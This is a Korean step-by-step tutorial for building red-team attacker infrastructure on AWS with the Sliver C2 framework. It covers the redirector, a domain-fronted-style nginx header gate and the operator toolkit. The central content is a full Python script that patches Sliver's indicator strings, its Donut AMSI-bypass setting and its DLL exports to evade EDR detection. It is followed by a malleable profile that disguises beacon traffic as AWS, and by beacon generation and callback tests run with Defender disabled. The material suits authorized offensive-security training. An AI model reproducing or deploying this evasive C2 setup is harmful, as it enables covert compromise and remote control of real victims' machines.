---
sidebar_position: 1
title: 인프라 구축 단계별 가이드
description: 레드팀 공격자 인프라 구축을 처음부터 끝까지 따라하기
keywords: [RedTeam, AWS, Sliver, 인프라구축, 단계별가이드]
---

# 인프라 구축 단계별 가이드

> 레드팀 공격자 인프라를 AWS에 구축하는 완벽한 체크리스트

## 구축 목표

- AWS 기반 3-Tier 레드팀 인프라 (C2, Redirector, Operator)
- Sliver C2 프레임워크 설치 및 탐지 우회
- 도메인 연동 및 SSL/TLS 적용
- 전체 인프라 통합 테스트

**예상 소요 시간**: 3-4시간

---

## 1단계: 로컬 환경 준비

### Kali Linux 설치 (가상 VM - VMware)

```bash
# 1. 패키지 업데이트
sudo apt update -y

# 2. 필수 도구 설치
sudo apt install -y pipx freerdp3-x11 vim tmux

# 3. Docker 설치
curl -fsSL https://download.docker.com/linux/debian/gpg | \
  sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

# 3.1. amd64 사용하는 OS - 예: windows
echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list


# 3.2. arm64 사용하는 OS - 예: Mac Silicon 
#'arch=amd64' 부분을 'arch=arm64'로 변경
echo "deb [arch=arm64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list

# 4. Docker Engine, CLI, containerd 설치
sudo apt update -y
sudo apt install -y docker-ce docker-ce-cli containerd.io
```

**✅ 체크포인트**: `docker --version` 확인

---

## 2단계: 도메인 준비

### 옵션 A: 기존 도메인 사용 (추천)

1. 도메인 레지스트라 로그인 (예: Gabia)
2. DNS 관리 페이지 진입
3. 네임서버를 나중에 Route53으로 변경 예정

### 옵션 B: 새 도메인 구매

1. https://expireddomains.net 에서 만료 도메인 검색
2. WHOIS 등록 3년+ 경과, Backlinks 5-10+ 필터
3. 도메인 구매 (AWS Route53 또는 다른 레지스트라)

**메모**: 도메인 이름: `_______________`

---

## 3단계: AWS VPC 생성

### AWS Console → VPC → VPC 생성

| 항목 | 값 |
|------|-----|
| VPC 설정 | VPC 등 |
| 이름 | RedTeam |
| IPv4 CIDR | 10.0.0.0/16 |
| 가용 영역 | 1 |
| 퍼블릭 서브넷 | 1 |
| 프라이빗 서브넷 | 0 |
| NAT 게이트웨이 | 없음 |
| VPC 엔드포인트 | 없음 |
| DNS 호스트 이름 | ✅ 활성화 |
| DNS 확인 | ✅ 활성화 |

**✅ 체크포인트**: VPC ID 확인 및 기록

---

## 4단계: SSH 키페어 생성

### 로컬에서 SSH 키 생성

```bash
# 키페어 생성
ssh-keygen -t rsa -b 2048 -f ~/.ssh/redteam -C "redteam" -N ""

# 권한 설정
chmod 600 ~/.ssh/redteam
chmod 644 ~/.ssh/redteam.pub

# 공개키 내용 복사
cat ~/.ssh/redteam.pub
```

### AWS에 공개키 등록

1. AWS Console → EC2 → 키 페어
2. "작업" → "키 페어 가져오기"
3. 이름: `redteam`
4. 공개키 붙여넣기

**✅ 체크포인트**: AWS에서 키페어 목록에 `redteam` 확인

---

## 5단계: EC2 인스턴스 생성 (3대)

### C2 서버 생성

**AWS Console → EC2 → 인스턴스 시작**

| 항목 | 값 |
|------|-----|
| 이름 | RedTeam-C2 |
| AMI | Ubuntu Server 24.04 LTS |
| 인스턴스 유형 | t3.small |
| 키 페어 | redteam |
| VPC | RedTeam |
| 서브넷 | RedTeam-subnet-public1 |
| 퍼블릭 IP 자동 할당 | ✅ 활성화 |
| 스토리지 | 16 GiB |

**보안 그룹 규칙**:

| 타입 | 포트 | 소스 | 설명 |
|------|------|------|------|
| SSH | 22 | 내 IP | 관리용 |
| 모든 트래픽 | All | 10.0.0.0/8 | VPC 내부 |

### Redirector 서버 생성

동일하게 생성, 다른 점:

| 항목 | 값 |
|------|-----|
| 이름 | RedTeam-Redirector |
| 인스턴스 유형 | t3.micro |
| 스토리지 | 8 GiB |

**보안 그룹 규칙**:

| 타입 | 포트 | 소스 |
|------|------|------|
| SSH | 22 | 내 IP |
| HTTP | 80 | 0.0.0.0/0 |
| HTTPS | 443 | 0.0.0.0/0 |

### Operator 서버 생성

| 항목 | 값 |
|------|-----|
| 이름 | RedTeam-Operator |
| 인스턴스 유형 | t3.micro |
| 스토리지 | 12 GiB |

보안 그룹은 Redirector와 동일

**IP 주소 기록**:
- C2 서버: `_______________`
- Redirector: `_______________`
- Operator: `_______________`

**✅ 체크포인트**: 3대 모두 SSH 접속 테스트

```bash
ssh -i ~/.ssh/redteam ubuntu@<각-서버-IP>
```

---

## 6단계: Route53 DNS 설정

### Route53 호스팅 영역 생성

1. AWS Console → Route53 → 호스팅 영역 → 생성
2. 도메인 이름: `your-domain.com`
3. 타입: 퍼블릭 호스팅 영역
4. 생성 후 **4개 네임서버 주소 복사**

### 도메인 레지스트라에서 네임서버 변경

1. 도메인 관리 페이지 접속
2. 네임서버 설정 변경
3. Route53의 4개 네임서버 입력
4. 저장 (전파 시간: 1-2시간)

### A 레코드 생성

1. Route53 호스팅 영역 → 레코드 생성
2. 레코드 이름: `www`
3. 레코드 유형: `A`
4. 값: `<Redirector-IP>`
5. TTL: `300`

**✅ 체크포인트**: DNS 전파 확인

```bash
nslookup www.your-domain.com

# 예상 출력:
# Name:   www.your-domain.com
# Address: <Redirector-IP>
```

---

## 7단계: Redirector 서버 설정

### SSH 접속

```bash
ssh -i ~/.ssh/redteam ubuntu@<Redirector-IP>
```

### nginx 설치 및 SSL 인증서

```bash
# nginx 설치
sudo apt update -y
sudo apt install -y nginx certbot python3-certbot-nginx

# SSL 인증서 발급
sudo certbot --nginx -d www.your-domain.com

# 이메일 입력 및 약관 동의
# HTTPS 자동 리다이렉트: Yes
```

### nginx 리버스 프록시 설정

```bash
sudo vim /etc/nginx/sites-available/redirector
```

다음 내용 입력 (C2 내부 IP 수정 필요):

```nginx
server {
    listen 443 ssl http2;
    server_name www.your-domain.com;

    ssl_certificate /etc/letsencrypt/live/www.your-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/www.your-domain.com/privkey.pem;

    location / {
        # 특정 헤더 검증
        if ($http_x_amz_target != "RedTeam") {
            return 403;
        }
        if ($http_x_amz_blob_type != "Local-redteam31337") {
            return 403;
        }

        # C2 서버로 프록시 (C2 프라이빗 IP 입력)
        proxy_pass https://10.0.x.x:443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_ssl_verify off;
    }
}
```

```bash
# 심볼릭 링크 생성
sudo ln -s /etc/nginx/sites-available/redirector /etc/nginx/sites-enabled/

# nginx 테스트 및 재시작
sudo nginx -t
sudo systemctl restart nginx
```

**✅ 체크포인트**: nginx 상태 확인

```bash
sudo systemctl status nginx
```

---

## 8단계: C2 서버 설정 (Sliver)

### SSH 접속 및 Root 전환

```bash
ssh -i ~/.ssh/redteam ubuntu@<C2-IP>
sudo su -
```

### 의존성 설치

```bash
apt update -y
apt install -y curl git make binutils bison gcc golang-go zip unzip
apt install -y libprotobuf-dev protobuf-compiler
```

### GVM 및 Go 1.20.7 설치

```bash
# GVM 설치
bash < <(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer)

# 환경변수 로드
source ~/.gvm/scripts/gvm

# Go 1.20.7 설치 (3-5분 소요)
gvm install go1.20.7
gvm use go1.20.7 --default

# Protobuf 도구 설치
go install google.golang.org/protobuf/cmd/protoc-gen-go@v1.27.1
go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@v1.2.0

# Go 버전 확인
go version
# 출력: go version go1.20.7 linux/arm64
```

### Sliver 다운로드

```bash
cd /opt
git clone https://github.com/BishopFox/sliver.git
cd sliver
git checkout tags/v1.5.43
```

### 탐지 우회 스크립트 적용

```bash
vim /opt/sliver/modsliver.py
```

다음 Python 스크립트 복사/붙여넣기:

```python
#!/usr/bin/env python3
import os
import re

BASE_DIR = "/opt/sliver"
TARGET_FILE = os.path.join(BASE_DIR, "implant/sliver/sliver.go")
DONUT_FILE = os.path.join(BASE_DIR, "server/generate/donut.go")
EXCLUDE_DIRS = {".git", ".github", "docs", "vendor"}

REPLACEMENTS = {
    "ScreenshotReq": "ScShotReqzz",
    "IfconfigReq": "IfcfgReqzz",
    "ImpersonateReq": "ImprReqzz",
    "InvokeMigrateReq": "InvMigReqzz",
    "RevToSelfReq": "RevSelfReqzz",
    "SideloadReq": "SidLdReqzz",
    "InvokeSpawnDllReq": "InvSpDllReqzz",
    "NetstatReq": "NetStReqzz",
    "httpSessionInit": "Robertzzz",
    "screenshotRequested": "scShotReqtdzz",
    "RegistryReadReq": "RegRdReqzz",
    "RequestResend": "ReqRsndzz",
    "GetPrivInfo": "GetPrInfozz",
    "-NoExit": "-nOeXIt",
    "bishopfox": "zishepnux",
    "BishopFox": "ZishepNux",
    "beacon": "beakon",
    "Beacon": "Beakon",
    "BEACON": "BEAKON",
}

def rename_files_beacon():
    for root, dirs, files in os.walk(".", topdown=False):
        for name in files + dirs:
            if "beacon" in name:
                old = os.path.join(root, name)
                new = os.path.join(root, name.replace("beacon", "beakon"))
                os.rename(old, new)

def replace_string_IOCs():
    for root, _, files in os.walk(BASE_DIR):
        if any(x in root for x in EXCLUDE_DIRS):
            continue
        for file in files:
            if file in {"obfs.sh", "modsliver.py"}:
                continue
            path = os.path.join(root, file)
            try:
                with open(path, "rb") as f:
                    content = f.read()
            except:
                continue
            for k, v in REPLACEMENTS.items():
                content = content.replace(k.encode("utf-8"), v.encode("utf-8"))
            try:
                with open(path, "wb") as f:
                    f.write(content)
            except:
                pass

def patch_donut():
    if os.path.exists(DONUT_FILE):
        with open(DONUT_FILE, "r+", encoding="utf-8") as f:
            content = f.read().replace("Bypass:     3", "Bypass:     1")
            f.seek(0)
            f.write(content)
            f.truncate()

def patch_max_connection():
    with open(TARGET_FILE, "r", encoding="utf-8") as f:
        lines = f.readlines()
    if not any("const maxConnectionErrors = 1000" in l for l in lines):
        for i, l in enumerate(lines):
            if "beacons := transports.StartBeaconLoop(abort)" in l:
                lines.insert(i + 1, "    const maxConnectionErrors = 1000\n")
                break
    for i, l in enumerate(lines):
        if "if transports.GetMaxConnectionErrors() < connectionErrors {" in l:
            context = lines[max(0, i - 15):i]
            if any("const maxConnectionErrors = 1000" in x for x in context):
                lines[i] = "        if connectionErrors > maxConnectionErrors {\n"
                break
    with open(TARGET_FILE, "w", encoding="utf-8") as f:
        f.writelines(lines)

def patch_dll_iocs():
    paths = [
        os.path.join(BASE_DIR, "implant/sliver/sliver.c"),
        os.path.join(BASE_DIR, "implant/sliver/sliver.go")
    ]
    pattern = re.compile(r'^func (VoidFunc|DllInstall|DllRegisterServer|DllUnregisterServer)\(\) { main\(\) }$')
    for path in paths:
        if not os.path.exists(path):
            continue
        with open(path, "r", encoding="utf-8") as f:
            lines = f.readlines()
        new_lines = []
        for line in lines:
            line = line.replace("StartW", "GoNowW")
            if not pattern.match(line.strip()):
                new_lines.append(line)
        with open(path, "w", encoding="utf-8") as f:
            f.writelines(new_lines)

def main():
    patch_max_connection()
    patch_donut()
    patch_dll_iocs()
    rename_files_beacon()
    replace_string_IOCs()
    print("All files have been updated.")

if __name__ == "__main__":
    main()
```

```bash
# 스크립트 실행
chmod +x modsliver.py
python3 modsliver.py

# 출력: All files have been updated.
```

### Sliver 컴파일

```bash
cd /opt/sliver

# Protobuf 파일 생성
make pb

# Sliver 컴파일 (5-10분 소요)
make

# 컴파일 확인
ls -lh sliver-server sliver-client
```

### Malleable C2 프로필 설정

```bash
# 서버 최초 실행 (설정 디렉토리 생성)
./sliver-server
# CTRL+C로 종료

# http-c2.json 백업 및 새 프로필 생성
mv ~/.sliver/configs/http-c2.json ~/.sliver/configs/http-c2-backup.json
vim ~/.sliver/configs/http-c2.json
```

다음 내용 입력:

```json
{
  "implant_config": {
      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/538.36 (KHTML, like Gecko) Chrome/132.0.0.13 Safari/536.36 Edg/132.0.0.13",
      "chrome_base_version": 132,
      "macos_version": "10_16_8",
      "headers": [
          {
              "name": "X-AMZ-Target",
              "value": "RedTeam"
          },
          {
              "name": "X-AMZ-Blob-Type",
              "value": "Local-redteam31337"
          }
      ],
      "max_files": 5,
      "min_files": 2,
      "max_paths": 5,
      "min_paths": 2,
      "poll_file_ext": "htmlx",
      "session_file_ext": "xml"
  },
  "server_config": {
      "headers": [
          {
              "name": "Server",
              "value": "awselb/2.0"
          }
      ],
      "cookies": ["_session_id"]
  }
}
```

### Sliver 서버 실행 및 테스트

```bash
# Sliver 서버 실행
./sliver-server

# HTTPS 리스너 시작
[server] sliver > https

# Beacon 생성 (도메인 수정 필요)
[server] sliver > generate beacon -b https://www.your-domain.com -S 5 -J 1 -f exe -s /tmp/test-beacon.exe -d

# 멀티플레이어 설정
[server] sliver > new-operator --name admin --lhost 127.0.0.1
[server] sliver > multiplayer

# 새 터미널에서 Client 접속
./sliver-client import ./admin_127.0.0.1.cfg
./sliver-client
```

**✅ 체크포인트**: Sliver Client 접속 성공 및 리스너 확인

```bash
sliver > jobs

# 출력:
# ID  Name   Protocol  Port
# 1   https  tcp       443
```

---

## 9단계: Operator 서버 설정

### SSH 접속

```bash
ssh -i ~/.ssh/redteam ubuntu@<Operator-IP>
```

### 도구 설치

```bash
# 기본 도구
sudo apt update -y
sudo apt install -y zip unzip golang-go pipx proxychains4 nmap vim tmux
sudo apt install -y python3-dev build-essential ruby ruby-dev

# evil-winrm
sudo gem install evil-winrm

# AWS CLI
cd /opt
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install

# NetExec
pipx install git+https://github.com/Pennyw0rth/NetExec

# Impacket
pipx install impacket

# BBOT
pipx install bbot

# PATH 설정
pipx ensurepath
source ~/.bashrc
```

**✅ 체크포인트**: 도구 설치 확인

```bash
aws --version
netexec --version
evil-winrm --help
```

---

## 10단계: 통합 테스트

### Beacon 생성 및 콜백 테스트

C2 서버에서:

```bash
# Beacon 생성
[server] sliver > generate beacon -b https://www.your-domain.com -S 5 -J 1 -f exe -s /tmp/final-beacon.exe

# 파일 권한 변경
[server] sliver > !chmod 755 /tmp/final-beacon.exe
```

로컬 Kali로 파일 전송:

```bash
scp -i ~/.ssh/redteam ubuntu@<C2-IP>:/tmp/final-beacon.exe ./
```

Windows 테스트 환경에서 실행:

```powershell
# Windows Defender 일시 비활성화
.\final-beacon.exe
```

C2 서버에서 콜백 확인:

```bash
sliver > beacons

# 예상 출력:
# ID        Name            Transport  Username  OS             Last Check-In
# a1b2c3d4  COOL_NAME       https      Admin     windows/amd64  5s ago
```

**✅ 최종 체크포인트**: Beacon 콜백 성공!

---

## 빠른 명령어 참조

### SSH 접속

```bash
ssh -i ~/.ssh/redteam ubuntu@<IP>
```

### Sliver 서버

```bash
# 서버 실행
cd /opt/sliver && ./sliver-server

# Client 실행
./sliver-client

# HTTPS 리스너
sliver > https

# Beacon 생성
sliver > generate beacon -b https://www.your-domain.com -S 5 -J 1 -f exe

# Beacon 목록
sliver > beacons

# Beacon 인터랙션
sliver > use <beacon-id>

# Armory 설치
sliver > armory install all
```

### nginx 관리

```bash
sudo systemctl status nginx
sudo systemctl restart nginx
sudo nginx -t
sudo tail -f /var/log/nginx/error.log
```

### DNS 확인

```bash
nslookup www.your-domain.com
dig www.your-domain.com A
```

---

## 트러블슈팅 체크리스트

### SSH 접속 실패

- [ ] 키 파일 권한 확인: `chmod 600 ~/.ssh/redteam`
- [ ] 보안 그룹에서 내 IP 허용 확인
- [ ] EC2 인스턴스 상태 "running" 확인

### DNS 전파 안 됨

- [ ] Route53 A 레코드 값 확인
- [ ] 도메인 레지스트라 네임서버 확인
- [ ] 1-2분 대기 후 재시도

### Beacon 콜백 실패

- [ ] Sliver HTTPS 리스너 실행 확인: `sliver > jobs`
- [ ] nginx 상태 확인: `sudo systemctl status nginx`
- [ ] nginx 로그 확인: `sudo tail -f /var/log/nginx/error.log`
- [ ] C2 보안 그룹 10.0.0.0/8 허용 확인
- [ ] Malleable C2 헤더와 nginx 헤더 일치 확인

### EC2 IP 변경됨

- [ ] EC2 재부팅 시 공인 IP 변경됨 (정상 동작)
- [ ] Route53 A 레코드를 새 IP로 업데이트
- [ ] 또는 Elastic IP 사용 (비용 발생)

---

## 참고 자료

- [Sliver C2 GitHub](https://github.com/BishopFox/sliver)
- [Sliver Wiki](https://github.com/BishopFox/sliver/wiki)
- [Red Team Infrastructure Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)
- [Reforging Sliver (탐지 우회)](https://fortbridge.co.uk/research/reforging-sliver-how-simple-code-edits-can-outmaneuver-edr/)
- [Malleable C2 Profiles](https://github.com/BC-SECURITY/Malleable-C2-Profiles)

---

**작성일**: 2025년 11월 30일  
**태그**: #RedTeam #AWS #Sliver #C2 #인프라구축
